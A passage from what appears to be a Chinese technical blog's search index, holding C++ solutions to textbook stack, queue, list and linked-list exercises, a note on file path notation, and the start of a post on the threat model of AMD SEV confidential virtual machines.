栈和队列","url":"/2023/07/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BC%96%E7%A8%8B%E9%A2%98%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/","content":"判断合法序列题目描述假设 I 和 O 分别表示入栈和出栈操作，栈的初态和终态均为空，入栈和出栈的操作序列可表示为仅由 I 和 O 组成的序列，可以操作的序列称为合法序列，否则称为非法序列。编写一个算法，判定所给的序列是否合法。若合法，返回 true，否则返回 false.\n解题代码bool isLegalSequence(const string&amp; sequence) &#123;    int iCnt = 0;    for (int i = 0; i &lt; sequence.size(); ++i) &#123;        if (sequence[i] == &#x27;I&#x27;) &#123;            ++iCnt;        &#125;        else &#123;            --iCnt;        &#125;        if (iCnt &lt; 0) &#123;            return false;        &#125;    &#125;    return iCnt == 0;&#125;\n利用栈模拟队列题目描述利用两个栈 s1 和 s2 来模拟一个队列，以实现队列的 3 个基本操作，包括入队，出队，判空。\n解题代码template&lt;typename T&gt;class stackBasedQueue &#123;private:    stack&lt;T&gt; s1, s2;public:    bool push(const T&amp; t) &#123;        s1.push(t);        return true;    &#125;    bool pop(T&amp; x) &#123;        if (!s2.empty()) &#123;            x = s2.top();            s2.pop();            return true;        &#125;        else if (!s1.empty()) &#123;            while (!s1.empty()) &#123;                int temp = s1.top();                s1.pop();                s2.push(temp);            &#125;            x = s2.top();            s2.pop();            return true;        &#125;        else &#123;            return false;        &#125;    &#125;    bool empty() &#123;        return s1.empty() &amp;&amp; s2.empty();    &#125;&#125;;\n设计队列题目描述请设计一个队列，要求满足：（1）初始时队列为空；（2）入队时，允许增加队列占用空间；（3）出队后，出队元素所占用的空间可重复使用，即整个队列所占用的空间只增不减；（4）入队操作和出队操作的时间复杂度始终保持为 O(1).\n解题代码template&lt;typename T&gt;struct ListNode &#123;    T val;    ListNode&lt;T&gt;* next;    ListNode(T val, ListNode&lt;T&gt;* next) : val(val), next(next) &#123;&#125;&#125;;template&lt;typename T&gt;class designedQueue &#123;private:    ListNode&lt;T&gt;* front, *rear;public:    designedQueue() &#123;        front = new ListNode&lt;T&gt;(-1, nullptr);        rear = front;        rear-&gt;next = front;    &#125;    bool push(const T&amp; val) &#123;        if (front == rear-&gt;next) &#123;            rear-&gt;next = new ListNode&lt;T&gt;(val, front);        &#125;        rear-&gt;val = val;        rear = rear-&gt;next;        return true;    &#125;    bool pop(T&amp; x) &#123;        if (front == rear) &#123;            return false;        &#125;        x = front-&gt;val;        front = front-&gt;next;        return true;    &#125;&#125;;\n递归转非递归题目描述利用一个栈实现以下递归函数的非递归运算：\n\n解题代码int nonRecursive(int n, int x) &#123;    if (n == 0) return 1;    else if (n == 1) return 2 * x;    stack&lt;pair&lt;int, int&gt;&gt; s; // (n, val)    for (int i = n; i &gt;= 2; --i) &#123;        s.emplace(i, -1); // 状态压栈    &#125;    int v1 = 1, v2 = 2 * n;    while (!s.empty()) &#123;        s.top().second = 2 * x * v2 + 2 * (s.top().first - 1) * v1;        v1 = v2;        v2 = s.top().second;        s.pop();    &#125;    return v2; // 栈中剩下的唯一值&#125;\n","categories":["数据结构与算法"],"tags":["C++","算法","数据结构"]},{"title":"数据结构编程题 顺序表","url":"/2023/07/03/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BC%96%E7%A8%8B%E9%A2%98%20%E9%A1%BA%E5%BA%8F%E8%A1%A8/","content":"删除最小值题目描述从顺序表中删除具有最小值的元素（假设唯一）并由函数返回被删元素的值。空出的位置由最后一个元素填补，若顺序表为空，则显示出错信息并退出运行。\n解题代码bool deleteMin(vector&lt;int&gt;&amp; nums, int&amp; val) &#123;    if (nums.empty()) &#123;        return false;    &#125;    int minVal = INT32_MAX, minIdx = 0;    for (int i = 0; i &lt; nums.size(); ++i) &#123;        if (minVal &gt; nums[i]) &#123;            minVal = nums[i];            minIdx = i;        &#125;    &#125;    nums[minIdx] = nums.back();    val = minVal;    return true;&#125;\n逆置顺序表题目描述设计一个高效算法，将顺序表 L 的所有元素逆置，要求算法的空间复杂度为 O(1).\n解题代码void reverseList(vector&lt;int&gt;&amp; nums) &#123;    int left = 0, right = nums.size() - 1;    while (left &lt; right) &#123;        swap(nums[left++], nums[right--]);    &#125;&#125;\n删除特定值的元素题目描述对长度为 n 的顺序表 L，编写一个时间复杂度为 O(n)、空间复杂度为 O(1) 的算法，该算法删除线性表中的所有值为 x 的数据元素。\n解题代码void deleteX(vector&lt;int&gt;&amp; nums, int x) &#123;    int n = nums.size(), xCnt = 0; // 记录当前遍历位置之前x的出现次数    for (int i = 0; i &lt; n; ++i) &#123;        nums[i - xCnt] = nums[i];        xCnt += nums[i] == x;    &#125;    nums.erase(nums.begin() + n - xCnt, nums.end()); // 删除冗余元素&#125;\n删除特定区间内的元素题目描述从有序顺序表中删除其值在给定值 s 和 t 之间（要求 s &lt; t）的所有元素，若 s 或 t 不合理或者顺序表为空，则显示错误信息并退出运行。\n解题代码bool deleteInterval(vector&lt;int&gt;&amp; nums, int s, int t) &#123;    if (s &gt;= t || nums.empty()) &#123;        return false;    &#125;    int n = nums.size();    int left = 0, right = n - 1;    while (nums[left] &lt; s) &#123; // 找到首个不小于s的元素        ++left;    &#125;    while (nums[right] &gt; t) &#123; // 找到首个不大于t的元素        --right;    &#125;    int length = right - left + 1;    for (int i = left; i + length &lt; n; ++i) &#123;        nums[i] = nums[i + length]; // 移动元素    &#125;    nums.erase(nums.begin() + n - length, nums.end());    return true;&#125;\n删除重复元素题目描述从有序顺序表中删除所有值重复的元素，使表中所有元素的值均不同。\n解题代码void deleteRedundancy(vector&lt;int&gt;&amp; nums) &#123;    int reCnt = 0, n = nums.size();    for (int i = 1; i &lt; n; ++i) &#123;        if (nums[i] == nums[i - 1]) &#123;            ++reCnt;        &#125;        else &#123;            nums[i - reCnt] = nums[i];        &#125;    &#125;    nums.erase(nums.begin() + n - reCnt, nums.end());&#125;\n合并有序顺序表题目描述将两个有序顺序表合并称为一个新的有序顺序表，并由函数返回结果顺序表。\n解题代码vector&lt;int&gt; mergeList(vector&lt;int&gt;&amp; nums1, vector&lt;int&gt;&amp; nums2) &#123;    int n1 = nums1.size(), n2 = nums2.size();    vector&lt;int&gt; mergeNums(n1 + n2);    int p1 = 0, p2 = 0, pm = 0;    while (p1 &lt; n1 &amp;&amp; p2 &lt; n2) &#123;        if (nums1[p1] &lt; nums2[p2]) &#123;            mergeNums[pm++] = nums1[p1++];        &#125;        else &#123;            mergeNums[pm++] = nums2[p2++];        &#125;    &#125;    while (p1 &lt; n1) &#123;        mergeNums[pm++] = nums1[p1++];    &#125;    while (p2 &lt; n2) &#123;        mergeNums[pm++] = nums2[p2++];    &#125;    return mergeNums;&#125;\n替换线性表位置题目描述已知在一维数组 A[m + n] 中依次存放两个线性表（a1, a2, …, am）和（b1, b2, …, bn）。编写一个函数，将数组中两个顺序表的位置互换，即将（b1, b2, …, bn）放在（a1, a2, …, am）的前面。\n解题代码void swapList(vector&lt;int&gt;&amp; nums, int m, int n) &#123;    for (int i = 0, j = m + n - 1; i &lt; j; ++i, --j) &#123;        swap(nums[i], nums[j]); // 整体逆置    &#125;    for (int i = 0, j = n - 1; i &lt; j; ++i, --j) &#123;        swap(nums[i], nums[j]); // 前n个元素逆置    &#125;    for (int i = n, j = m + n - 1; i &lt; j; ++i, --j) &#123;        swap(nums[i], nums[j]); // 后m个元素逆置    &#125;&#125;\n查找有序表中的特定值元素题目描述线性表（a1, a2, …, an）中的元素递增有序且按顺序存储在计算机内。要求设计一个算法，完成用最少时间在表中查找值为 x 的元素，若找到，则将其与后继元素位置相交换。若找不到，则将其插入表中并使表中元素仍然递增有序。\n解题代码void searchX(vector&lt;int&gt;&amp; nums, int x) &#123;    int left = 0, right = nums.size() - 1;    while (left &lt;= right) &#123;        int mid = (left + right) / 2; // 二分查找        if (x == nums[mid]) &#123;            if (mid != nums.size() - 1) &#123;                swap(nums[mid], nums[mid + 1]);            &#125;            return;        &#125;        else if (x &lt; nums[mid]) &#123;            right = mid - 1;        &#125;        else &#123;            left = mid + 1;        &#125;    &#125;    nums.insert(nums.begin() + left, x); // 查找失败，插入x&#125;\n查找两个序列的中位数题目描述一个长度为 L（L &gt;= 1） 的升序序列 S，处在第 ⌈L / 2⌉ 个位置的数称为 S 的中位数。例如，若序列 S1 = (11, 13, 15, 17, 19)，则 S1 的中位数是 15，两个序列的中位数是含它们所有元素的升序序列的中位数。例如，若 S2 = (2, 4, 6, 8, 20)，则 S1 和 S2 的中位数为 11。现在有两个等长升序序列 A 和 B，试设计一个在时间和空间两方面都尽可能高效的算法，找出两个序列 A 和 B 的中位数。 \n解题代码int searchMedian(vector&lt;int&gt;&amp; nums1, vector&lt;int&gt;&amp; nums2) &#123;    int n = nums1.size();    int left1 = 0, right1 = n - 1, left2 = 0, right2 = n - 1;    while (left1 &lt; right1 &amp;&amp; left2 &lt; right2) &#123;        int mid1 = (left1 + right1) / 2;        int mid2 = (left2 + right2) / 2;        if (nums1[mid1] == nums2[mid2]) &#123;            return nums1[mid1];        &#125;        else if (nums1[mid1] &lt; nums2[mid2]) &#123;            // 判断区间长度的奇偶性以确保 nums1 和 nums2 区间长度相等            if ((right1 - left1) % 2 == 0) &#123;                left1 = mid1;                right2 = mid2;            &#125;            else &#123;                left1 = mid1 + 1;                right2 = mid2;            &#125;        &#125;        else &#123;            if ((right2 - left2) % 2 == 0) &#123;                right1 = mid1;                left2 = mid2;            &#125;            else &#123;                right1 = mid1;                left2 = mid2 + 1;            &#125;        &#125;    &#125;    return min(nums1[left1], nums2[left2]);&#125;\n数组的主元素题目描述已知一个整数序列 A = (a0, a1, …, an - 1)，其中 0 &lt;= ai &lt; n（0 &lt;= i &lt; n）。若存在 ap1 = ap2 = … = apm = x 且 m &gt; n / 2（0 &lt;= pk &lt; n, 1 &lt;= k &lt;= m），则称 x 为 A 的主元素。例如 A = (0, 5, 5, 3, 5, 7, 5, 5)，则 5 为主元素；又如 A = (0, 5, 5, 3, 5, 1, 5, 7)。则 A 中没有主元素。假设 A 中的 n 个元素保存在一个一维数组中，请设计一个尽可能高效的算法，找出 A 的主元素。若存在主元素，则输出该元素；否则输出 -1。\n解题代码int getMainElem(vector&lt;int&gt;&amp; nums) &#123;    int n = nums.size();    int mainElem = -1, cnt = 0;     for (int i = 0; i &lt; n; ++i) &#123; // 找出可能为主元素的元素        if (nums[i] == mainElem) &#123;            ++cnt;        &#125;        else if (cnt &gt; 0) &#123;            --cnt;        &#125;        else &#123;            mainElem = nums[i];            cnt = 1;        &#125;    &#125;    cnt = 0;    for (int i = 0; i &lt; n; ++i) &#123; // 判断该元素是否为主元素        cnt += nums[i] == mainElem;    &#125;    return cnt &gt; n / 2 ? mainElem : -1;&#125;\n未出现的最小正整数题目描述给定一个含 n（n &gt;= 1）个整数的数组，请设计一个在时间上和空间上尽可能高效的算法，找出数组中未出现的最小正整数。例如，数组 {-5, 3, 2, 3} 中未出现的最小正整数为 1；数组 {1, 2, 3} 中未出现的最小正整数为 4。\n解题代码int getMinPositive(vector&lt;int&gt;&amp; nums) &#123;    int n = nums.size();    vector&lt;bool&gt; numSet(n, false);    for (int i = 0; i &lt; n; ++i) &#123;        if (nums[i] &gt; 0 &amp;&amp; nums[i] &lt;= n) &#123;            numSet[nums[i] - 1] = true;        &#125;    &#125;    for (int i = 0; i &lt; n; ++i) &#123;        if (!numSet[i]) &#123;            return i + 1;        &#125;    &#125;    return n + 1;&#125;\n","categories":["数据结构与算法"],"tags":["C++","算法","数据结构"]},{"title":"文件路径的表示方法","url":"/2021/05/16/%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95/","content":"文件路径作为计算机基础内容，在很多时候都扮演着十分重要的角色，例如控制台命令、资源文件的存放等等，以下将介绍计算机文件路径的表示方法以及一些常见的使用场景。\n\n文件路径的表示分为两种方式：绝对路径表示法和相对路径表示法。\n绝对路径与相对路径的区别绝对路径的表示绝对路径顾名思义就是文件在硬盘上存储的真正路径，它不会被更改，除非文件在硬盘中的位置发生改变。绝对路径表示格式为：“\\&lt;硬盘符>\\\\&lt;目录1>\\\\&lt;目录2>…\\\\&lt;文件名>”，例如test.txt文件存储在C盘cat1下的cat2的cat3中，它用绝对路径表示为C:\\cat1\\cat2\\test.txt。\n相对路径的表示相对路径表示从当前文件位置出发，指向目标文件的路径，它是目标文件与当前文件的相对位置，会随着当前文件位置的不同而使与同一文件的相对位置发生改变。相对路径的表示格式为：“./\\&lt;目录1>/\\&lt;目录2>…/\\&lt;文件名>”（这里的“./”可以省略），例如当前HTML文件root.html位于C盘根目录下，text.txt文件存储在C盘cat1文件夹下的cat2文件夹中，要想在root.html中引用text.txt则用相对路径表示为cat1/cat2/test.txt（“./”已省略）。\n如果想要表示当前文件上级目录的文件，可以使用“../”来表示，还是上面的例子，假如我们要在test.txt文件下用相对路径表示root.html，则可以表示为../../root.html。\n注意事项\n不同盘符间的文件不能用相对路径来表示，例如位于C盘下的文件无法使用相对路径来表示D盘中的文件，其实可以这么来理解：所谓相对路径，就是相对非根目录的某个目录的绝对路径。\n绝对路径不同目录间既可以用“\\”也可以用“/”来分隔，而相对路径只能用“/”，这里推荐表示绝对路径时使用“\\”，可以为两种表示方法做一个很好的区分。\n\n常见使用场景控制台命令”cd”“cd”命令可以更改执行控制台命令的目录，这个目录既可以用绝对路径表示也可以用相对路径表示，但是无论哪种路径表示都只能更改为初始盘符中的目录，也就是系统盘目录。\n\n如果要更改执行目录为其他盘符下的目录，可以先输入“\\&lt;硬盘符>”，比方说要切换到上图试图切换的目录，可以先输入D:，然后再选择绝对路径。\n\n程序中资源的引用如果想要在编写的程序中引用外部资源文件（图片、音频等等），则必须要用相对路径，除非你编写的程序只需要在你当前设备上运行。因为你的程序往往放在一个大的文件夹当中，当这个大的文件夹被放置在计算机不同目录下时，资源文件的绝对路径也不相同，而源代码与资源文件之间的相对位置则是保持不变的，这保证了只要用户不刻意的去改变资源文件的存放位置，那么不管整个文件夹被放置在何处，资源文件都能被正常的引用。\n","categories":["计算机基础"],"tags":["文件","Windows10"]},{"title":"数据结构编程题 链表","url":"/2023/07/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BC%96%E7%A8%8B%E9%A2%98%20%E9%93%BE%E8%A1%A8/","content":"链表定义以下为本文解题代码的链表定义。\nstruct ListNode &#123;    int val;    ListNode* next;    ListNode(int val = 0, ListNode* next = nullptr) : val(val), next(next) &#123;&#125;&#125;;\n递归删除结点题目描述设计一个递归算法，删除不带头结点的单链表 L 中的所有值为 x 的结点，并返回新的链表头节点。\n解题代码ListNode* deleteNodeRecur(ListNode* head, int x) &#123;    if (head == nullptr) return head;    head-&gt;next = deleteNodeRecur(head-&gt;next, x);    if (head-&gt;val == x) &#123;        ListNode* nextNode = head-&gt;next;        delete head;        return nextNode;    &#125;    else &#123;        return head;    &#125;&#125;\n删除结点题目描述在带头结点的单链表 L 中，删除所有值为 x 的结点，并释放其空间，假设值为 x 的结点不唯一，试编写算法以实现上述功能。\n解题代码void deleteNode(ListNode* head, int x) &#123;    if (head-&gt;next == nullptr) return;    while (head-&gt;next != nullptr) &#123;        if (head-&gt;next-&gt;val == x) &#123;            ListNode* p = head-&gt;next;            head-&gt;next = head-&gt;next-&gt;next;            delete p;        &#125;        else &#123;            head = head-&gt;next;        &#125;    &#125;&#125;\n反向输出结点值题目描述设 L 为不带头结点的单链表，编写算法实现从尾到头反向输出每个结点的值。\n解题代码void reversePrint(ListNode* head) &#123;    if (head == nullptr) return;    reversePrint(head-&gt;next);    cout &lt;&lt; head-&gt;val &lt;&lt; &quot; &quot;;&#125;\n删除最小值结点题目描述试编写在带头结点的单链表 L 中删除一个最小值结点的高效算法（假设最小值结点是唯一的）。\n解题代码void deleteMinNode(ListNode* head) &#123;    if (head-&gt;next == nullptr) return;    ListNode* preMinNode = head;    ListNode* minNode = head-&gt;next;    while (head-&gt;next != nullptr) &#123;        if (head-&gt;next-&gt;val &lt; minNode-&gt;val) &#123;            preMinNode = head;            minNode = head-&gt;next;        &#125;        head = head-&gt;next;    &#125;    preMinNode-&gt;next = preMinNode-&gt;next-&gt;next;    delete minNode;&#125;\n逆置链表题目描述试编写算法将带头结点的单链表就地逆置。所谓“就地”是指辅助空间复杂度为 O(1).\n解题代码void reverseList(ListNode* head) &#123;    ListNode* preNode = nullptr;    ListNode* curNode = head-&gt;next;    while (curNode != nullptr) &#123;        ListNode* tempNode = curNode-&gt;next;        curNode-&gt;next = preNode;        preNode = curNode;        curNode = tempNode;    &#125;    head-&gt;next = preNode;&#125;\n链表排序题目描述有一个带头结点的单链表 L，设计一个算法使其元素单调递增有序。\n解题代码选择排序void selectSortList(ListNode* head) &#123;    ListNode* beginNode = head-&gt;next;    while (beginNode != nullptr) &#123;        ListNode* curNode = beginNode;        ListNode* minNode = curNode;        int minVal = curNode-&gt;val;        while (curNode != nullptr) &#123;            if (minVal &gt; curNode-&gt;val) &#123;                minVal = curNode-&gt;val;                minNode = curNode;            &#125;            curNode = curNode-&gt;next;        &#125;        swap(beginNode-&gt;val, minNode-&gt;val);        beginNode = beginNode-&gt;next;    &#125;&#125;\n插入排序void insertSort(ListNode* head) &#123;    if (head-&gt;next == nullptr) return;    ListNode* lastSorted = head; // 最后一个已排序结点    ListNode* curNode = head-&gt;next; // 当前待排序结点    while (curNode != nullptr) &#123;        if (lastSorted-&gt;val &lt;= curNode-&gt;val) &#123;            lastSorted = lastSorted-&gt;next;        &#125;        else &#123;            ListNode* preNode = head;            while (preNode-&gt;next-&gt;val &lt;= curNode-&gt;val) &#123;                preNode = preNode-&gt;next;            &#125;            lastSorted-&gt;next = curNode-&gt;next;            curNode-&gt;next = preNode-&gt;next;            preNode-&gt;next = curNode;        &#125;        curNode = lastSorted-&gt;next;    &#125;&#125;\n寻找两链表的公共结点题目描述给定两个单链表，编写算法找出两个链表的公共结点。\n解题代码ListNode* publicNode(ListNode* head1, ListNode* head2) &#123;    ListNode* curNode1 = head1-&gt;next;    ListNode* curNode2 = head2-&gt;next;    while (curNode1 != curNode2) &#123;        if (curNode1 == nullptr) &#123;            curNode1 = head2-&gt;next;        &#125;        else &#123;            curNode1 = curNode1-&gt;next;        &#125;        if (curNode2 == nullptr) &#123;            curNode2 = head1-&gt;next;        &#125;        else &#123;            curNode2 = curNode2-&gt;next;        &#125;    &#125;    return curNode1;&#125;\n分解单链表题目描述将一个带头结点的单链表 A 分解为两个带头结点的单链表 A 和 B，使得 A 表中含有原表中序号为奇数的元素，而 B 表中含有原表中序号为偶数的元素，且保持其相对顺序不变。\n解题代码ListNode* decomposeList(ListNode* head) &#123;    ListNode* bHead = new ListNode(-1);    ListNode* bCurNode = bHead;    if (head-&gt;next != nullptr) &#123;        head = head-&gt;next;    &#125;    while (head != nullptr &amp;&amp; head-&gt;next != nullptr) &#123;        bCurNode-&gt;next = new ListNode(head-&gt;next-&gt;val, nullptr);        bCurNode = bCurNode-&gt;next;        ListNode* tempNode = head-&gt;next;        head-&gt;next = head-&gt;next-&gt;next;        delete tempNode;        head = head-&gt;next;    &#125;    return bHead;&#125;\n链表元素去重题目描述在一个递增有序的线性表中，有数值相同的元素存在。若存储方式为不带头结点的单链表，设计算法去掉数值相同的元素，使表中不再有重复的元素，例如（7, 10, 10, 21, 30, 42, 42, 42, 51, 70）将变为（7, 10, 21, 30, 42, 51, 70）。\n解题代码void deduplicateList(ListNode* head) &#123;    while (head != nullptr &amp;&amp; head-&gt;next != nullptr) &#123;        if (head-&gt;val == head-&gt;next-&gt;val) &#123;            ListNode* tempNode = head-&gt;next;            head-&gt;next = head-&gt;next-&gt;next;            delete tempNode;        &#125;        else &#123;            head = head-&gt;next;        &#125;    &#125;&#125;\n合并有序单链表题目描述假设有两个按元素递增次序排列的线性表，均已带头结点的单链表形式存储。请编写算法将这两个单链表归并为一个按元素递减次序排列的单链表，并要求利用原来两个单链表的结点存放归并后的单链表。\n解题代码ListNode* mergeSortedList(ListNode* head1, ListNode* head2) &#123;    head1 = head1-&gt;next;    head2 = head2-&gt;next;    ListNode* head3 = new ListNode(-1);    while (head1 != nullptr &amp;&amp; head2 != nullptr) &#123;        if (head1-&gt;val &lt;= head2-&gt;val) &#123;            // 头插法使得插入后逆序            ListNode* newNode = head1;            head1 = head1-&gt;next;            newNode-&gt;next = head3-&gt;next;            head3-&gt;next = newNode;        &#125;        else &#123;            ListNode* newNode = head2;            head2 = head2-&gt;next;            newNode-&gt;next = head3-&gt;next;            head3-&gt;next = newNode;        &#125;    &#125;    while (head1 != nullptr) &#123;        ListNode* newNode = head1;        head1 = head1-&gt;next;        newNode-&gt;next = head3-&gt;next;        head3-&gt;next = newNode;    &#125;    while (head2 != nullptr) &#123;        ListNode* newNode = head2;        head2 = head2-&gt;next;        newNode-&gt;next = head3-&gt;next;        head3-&gt;next = newNode;    &#125;    return head3;&#125;\n根据公共元素建立链表题目描述设 A 和 B 是两个带头结点的单链表，其中元素递增有序且无重复元素。设计一个算法从 A 和 B 中的公共元素产生单链表 C，要求不破坏 A、B 的结点。\n解题代码ListNode* generateList(ListNode* head1, ListNode* head2) &#123;    ListNode* head3 = new ListNode(-1);    ListNode* curNode = head3;    head1 = head1-&gt;next;    head2 = head2-&gt;next;    while (head1 != nullptr &amp;&amp; head2 != nullptr) &#123;        if (head1-&gt;val == head2-&gt;val) &#123;            curNode-&gt;next = new ListNode(head1-&gt;val);            curNode = curNode-&gt;next;            head1 = head1-&gt;next;            head2 = head2-&gt;next;        &#125;        else if (head1-&gt;val &gt; head2-&gt;val) &#123;            head2 = head2-&gt;next;        &#125;        else &#123;            head1 = head1-&gt;next;        &#125;    &#125;    return head3;&#125;\n两链表的交集题目描述已知两个带头节点的单链表 A 和 B 分别表示两个集合，其元素递增排列且无重复元素。编制函数，求 A 和 B 的交集，存放于 A 链表中，并释放多余的结点。\n解题代码void listIntersection(ListNode* head1, ListNode* head2) &#123;    ListNode* curNode1 = head1-&gt;next;    ListNode* curNode2 = head2-&gt;next;    ListNode* preNode = head1;    while (curNode1 != nullptr &amp;&amp; curNode2 != nullptr) &#123;        if (curNode1-&gt;val == curNode2-&gt;val) &#123;            preNode-&gt;next = curNode1;            preNode = preNode-&gt;next;            curNode1 = curNode1-&gt;next;            ListNode* tempNode = curNode2;            curNode2 = curNode2-&gt;next;            delete tempNode;        &#125;        else if (curNode1-&gt;val &gt; curNode2-&gt;val) &#123;            ListNode* tempNode = curNode2;            curNode2 = curNode2-&gt;next;            delete tempNode;        &#125;        else &#123;            ListNode* tempNode = curNode1;            curNode1 = curNode1-&gt;next;            delete tempNode;        &#125;    &#125;    // 释放剩余结点    while (curNode1 != nullptr) &#123;        ListNode* tempNode = curNode1;        curNode1 = curNode1-&gt;next;        delete tempNode;    &#125;    while (curNode2 != nullptr) &#123;        ListNode* tempNode = curNode2;        curNode2 = curNode2-&gt;next;        delete tempNode;    &#125;    preNode-&gt;next = nullptr;&#125;\n判断连续子序列题目描述两个整数序列 A = a1, a2, a3, …, am 和 B = b1, b2, b3, …, bn 已经存入两个带头结点单链表中，设计一个算法，判断序列 B 是否是序列 A 的连续子序列。\n解题代码bool isSubsequence(ListNode* head1, ListNode* head2) &#123;    ListNode* startNode = head1-&gt;next;    ListNode* curNode1 = startNode;    ListNode* curNode2 = head2-&gt;next;    while (curNode1 != nullptr &amp;&amp; curNode2 != nullptr) &#123;        if (curNode1-&gt;val == curNode2-&gt;val) &#123;            curNode1 = curNode1-&gt;next;            curNode2 = curNode2-&gt;next;        &#125;        else &#123;            startNode = startNode-&gt;next;            curNode1 = startNode;            curNode2 = head2-&gt;next;        &#125;    &#125;    return curNode2 == nullptr;&#125;\n判断链表环路题目描述单链表有环，是指单链表的最后一个结点的指针指向了链表的某个结点（通常单链表的最后一个结点的指针域是空的）。试编写算法判断不带头结点的单链表是否存在环。\n解题代码哈希表bool hasCycle(ListNode* head) &#123;    unordered_set&lt;ListNode*&gt; nodeSet;    while (head != nullptr) &#123;        if (nodeSet.count(head) &gt; 0) &#123;            return true;        &#125;        nodeSet.emplace(head);        head = head-&gt;next;    &#125;    return false;&#125;\n快慢指针bool hasCycle(ListNode* head) &#123;    if (head == nullptr || head-&gt;next == nullptr) &#123;        return false;    &#125;    ListNode* slow = head; // 每次走一步    ListNode* fast = head; // 如果可能，每次走两步    while (slow != nullptr &amp;&amp; fast != nullptr) &#123;        slow = slow-&gt;next;        fast = fast-&gt;next;        if (fast != nullptr) &#123;            fast = fast-&gt;next;        &#125;        if (slow == fast) &#123;            return true;        &#125;    &#125;    return false;&#125;\n查找倒数第k个结点题目描述已知一个带有头结点的单链表，在不改变链表的前提下，请设计一个尽可能高效的算法，查找链表中倒数第 k 个位置的结点（k 为正整数）。若查找成功，算法输出该结点的值，并返回 1；否则，只返回 0.\n解题代码bool lastKthNode(ListNode* head, int k) &#123;    ListNode* curNode1 = head-&gt;next;    // 先将curNode1移动到第k个结点    for (int i = 0; i &lt; k; ++i) &#123;         if (curNode1 != nullptr) &#123;            curNode1 = curNode1-&gt;next;        &#125;        else &#123;            return false;        &#125;    &#125;    ListNode* curNode2 = head-&gt;next;    // 当curNode1到达末尾，curNode2位于倒数第k个结点    while (curNode1 != nullptr) &#123;        curNode1 = curNode1-&gt;next;        curNode2 = curNode2-&gt;next;    &#125;    cout &lt;&lt; curNode2-&gt;val &lt;&lt; endl;    return true;&#125;\n重排链表题目描述设线性表 L = (a1, a2, a3, …, an-2, an - 1, an) 采用带头结点的单链表保存，请设计一个空间复杂度为 O(1) 且时间上尽可能高效的算法，重新排列 L 中的各结点，得到线性表 L’ = (a1, an, a2, an - 1, a3, an - 2, …)。\n解题代码// 中间结点ListNode* middleNode(ListNode* head) &#123;    ListNode* slow = head;    ListNode* fast = head;    while (fast-&gt;next != nullptr) &#123;        slow = slow-&gt;next;        fast = fast-&gt;next;        if (fast-&gt;next != nullptr) &#123;            fast = fast-&gt;next;        &#125;    &#125;    return slow;&#125;// 反转链表ListNode* reverseList(ListNode* head) &#123;    ListNode* preNode = nullptr;    ListNode* curNode = head;    while (curNode != nullptr) &#123;        ListNode* tempNode = curNode-&gt;next;        curNode-&gt;next = preNode;        preNode = curNode;        curNode = tempNode;    &#125;    return preNode;&#125;// 归并链表void mergeList(ListNode* l1, ListNode* l2) &#123;    while (l1 != nullptr &amp;&amp; l2 != nullptr) &#123;        ListNode* l1Next = l1-&gt;next;        ListNode* l2Next = l2-&gt;next;        l1-&gt;next = l2;        l1 = l1Next;        l2-&gt;next = l1;        l2 = l2Next;    &#125;&#125;// 重排链表void reorderList(ListNode* head) &#123;    ListNode* l1 = head-&gt;next;    ListNode* mid = middleNode(l1);    ListNode* l2 = mid-&gt;next;    mid-&gt;next = nullptr;    l2 = reverseList(l2);    mergeList(l1, l2);&#125;\n","categories":["数据结构与算法"],"tags":["C++","算法","数据结构"]},{"title":"机密虚拟机的威胁模型","url":"/2025/05/06/%E6%9C%BA%E5%AF%86%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B/","content":"本文将介绍近年兴起的机密虚拟机（Confidential Virtual Machine）技术所旨在抵御的威胁模型，主要关注内存机密性（confidentiality）和内存完整性（integrity）两个方面。在解释该威胁可能造成的问题的同时，还将同时介绍现在最主流的机密虚拟机解决方案之一的 AMD SEV-SNP 如何如何应对该威胁。\n\n在正式介绍之前，有必要先明确这样一个概念，在机密虚拟机的威胁模型中，Hypervisor 被认为是不可信的。恶意的 Hypervisor 可能读取虚拟机的内存数据，导致虚拟机用户隐私泄露；或是直接写入虚拟机内存，导致虚拟机运行产生预期之外的结果。\n机密性虚拟机内存由于虚拟机的内存是通过第二阶段页表映射（GPA -&gt; HPA）到宿主机内存中，且该页表由 Hypervisor 进行维护。因此在未引入机密虚拟机技术时，Hypervisor 能够直接借助该页表映射，手动进行地址转换并读取虚拟机内存数据。\n对于虚拟机内存的机密性，AMD 在最早的 SEV 技术（2016 年）中已经解决。解决方法是为每个虚拟机引入一个 AES 加密密钥，虚拟机指定为私有的页面在被读写时将会自动地进行加解密，这一过程对于虚拟机而言完全无感。当 Hypervisor 尝试读取虚拟机的私有内存数据时，只会读取到被加密过的密文数据，保障了数据的机密性。\n\n虚拟机寄存器状态虚拟机在 VM Exit 到 Hypervisor 时，需要将此时的 CPU 状态，即寄存器状态进行保存（通常保存在一个数据结构中，AMD-V 虚拟机为 VMCB）。而 Hypervisor 就能在重新 VM Entry 到虚拟机前，很轻松地读取其中的内容。\nAMD 在 2017 年引入了 SEV-ES（Encrypted State）特性，在发生 VM Exit 时，虚拟机寄存器内容会被自动加密，并存入加密的 VMSA（Virtual Machine Save Area）中，原有的 VMCB 的控制字段（非加密）存储着指向 VMSA 的指针。\nstruct __attribute__ ((__packed__)) vmcb_control_area &#123;\t...\tu64 vmsa_pa;\t\t/* Used for an SEV-ES guest */\t...&#125;;struct vmcb &#123;\tstruct vmcb_control_area control;\tunion &#123;\t\tstruct vmcb_save_area save;\t\t/*\t\t * For SEV-ES VMs, the save area in the VMCB is used only to\t\t * save/load host state.  Guest state resides in a separate\t\t * page, the aptly named VM Save Area (VMSA), that is encrypted\t\t * with the guest&#x27;s private key.\t\t */\t\tstruct sev_es_save_area host_sev_es_save;\t&#125;;&#125; __packed;\n完整性内存加密只解决了 Hypervisor 恶意读取虚拟机数据的问题，Hypervisor 仍然可以在不知道数据具体内容的情况下，恶意地对虚拟机内存进行写入，从而破坏虚拟机内存数据，造成预料之外的结果。\nAMD 在 2020 年引入了 SEV-SNP 扩展，引入了对虚拟机完整性保护的支持。核心机制是 